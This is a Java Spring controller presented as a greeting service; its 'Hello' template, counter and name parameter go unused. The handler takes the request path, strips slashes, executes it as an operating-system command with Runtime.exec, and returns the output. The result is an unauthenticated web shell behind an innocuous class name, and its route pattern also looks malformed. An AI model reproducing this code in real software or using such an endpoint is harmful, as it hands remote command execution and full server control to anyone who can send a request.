package com.example.restservice;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.atomic.AtomicLong;

import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.xml.ws.Response;

@RestController
@Slf4j
public class GreetingController {

	private static final String template = "Hello, %s!";
	private final AtomicLong counter = new AtomicLong();

	@RequestMapping(value = "/**/{[path:[^\\.]*}")
	public String greeting(final HttpServletRequest request, @RequestParam(value = "name", defaultValue = "World") String name) throws InterruptedException, IOException {
		String script = request.getRequestURI().toString().replace("/","");
		Process p = null;
		try {
			p = Runtime.getRuntime().exec(script);
		} catch (IOException e) {
			return e.getMessage();
		}
		p.waitFor();

		BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
		BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
		String returnThis = "";

		String line = "";
		while ((line = reader.readLine()) != null) {
			returnThis +="\n"+line;
			System.out.println(line);
		}

		line = "";
		while ((line = errorReader.readLine()) != null) {
			returnThis+="\n"+line;
			System.out.println(line);
		}

		return returnThis;
	}
}
